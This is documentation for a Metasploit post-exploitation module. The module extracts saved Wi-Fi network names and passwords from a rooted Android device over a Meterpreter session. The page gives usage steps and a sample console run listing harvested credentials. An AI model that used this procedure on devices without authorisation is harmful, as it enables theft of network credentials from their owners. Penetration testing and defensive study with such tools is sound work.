## Vulnerable Application

  This post-exploitation module will extract saved wireless AccessPoint
  credentials from the target android device.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Make sure the session is **root**
  4. Do: `use post/android/gather/wireless_ap`
  5. Do: `set SESSION <session id>`
  6. Do: `run`
  7. You should be able to see the extracted bssids and passwords of wireless
     APs

## Options

  - **SESSION** - The session to run the module on.

## Extracted data

  - Wireless AP creds

## Example Scenario


  ```
msf5 exploit(multi/handler) > use post/android/gather/wireless_ap
msf5 post(android/gather/wireless_ap) > set session 1
session => 1
msf5 post(android/gather/wireless_ap) > run

Wireless APs
============

 SSID                  net_type  password
 ----                  --------  --------
 ADYYYXRoYXJ2YWpvc2hp  WPA-PSK   lkjhgfdsa
 FCP_WiFi              NONE
 HomeCable             WPA-PSK   p@$$w0rd
 Troika                WPA-PSK   ika@12345
 

[*] Post module execution completed
msf5 post(android/gather/wireless_ap) >
  ```
